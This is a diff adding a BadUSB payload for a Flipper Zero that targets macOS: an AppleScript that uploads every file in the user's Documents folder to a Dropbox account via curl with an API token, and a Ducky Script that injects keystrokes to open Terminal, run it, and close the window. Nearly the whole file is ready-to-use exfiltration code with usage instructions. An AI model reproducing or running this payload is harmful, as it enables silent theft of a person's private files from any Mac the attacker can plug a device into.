@@ -1,0 +1,59 @@
+REM This script copies the contents of the Documents folder and uploads it to a specific dropbox API
+
+REM Author: Narsty
+REM Title: Documents Data Upload MacOs 
+REM Version 1.0 MacOs
+
+REM Copy and paste this osascript/code (lines 12-31)  into the Script editor App on your MacOs
+REM Replace the "Your API Access token Here" placeholder with your actual Dropbox API token. line 13
+REM Save this script below as docapi.scpt file (Use Script Editor) to your desktop.
+
+
+set documentsPath to POSIX path of (path to documents folder)
+set dropboxAPIPath to "Your API Access token Here"
+set apiEndpointURL to "https://content.dropboxapi.com/2/files/upload"
+
+-- Get a list of files in the Documents folder
+set fileNames to paragraphs of (do shell script "find " & quoted form of documentsPath & " -type f -maxdepth 1 -exec basename {} \\;")
+
+-- Iterate over each file and upload it individually
+repeat with fileName in fileNames
+	set filePath to documentsPath & fileName
+	-- Construct the cURL command to upload the file
+	set uploadScript to "curl -X POST " & quoted form of apiEndpointURL & " " & ¬
+		"-H \"Authorization: Bearer " & dropboxAPIPath & "\" " & ¬
+		"-H \"Dropbox-API-Arg: {\\\"path\\\": \\\"/" & fileName & "\\\", \\\"mode\\\": \\\"add\\\", \\\"autorename\\\": true, \\\"mute\\\": false}\" " & ¬
+		"-H \"Content-Type: text/plain; charset=dropbox-cors-hack\" " & ¬
+		"-T " & quoted form of (POSIX path of filePath)
+	
+	-- Run the cURL command
+	do shell script uploadScript
+end repeat
+
+
+
+
+
+REM Final step is to save the below Ducky Script as a .txt file lines 41-54 (main Read.me has step by step directions)
+REM and put the .txt file on your BADUSB flipper zero APP to execute the osascript through the terminal.
+
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd ~/Desktop
+ENTER
+DELAY 500
+STRING osascript docapi.scpt
+ENTER
+DELAY 7000
+GUI w
+
+
+
+
+
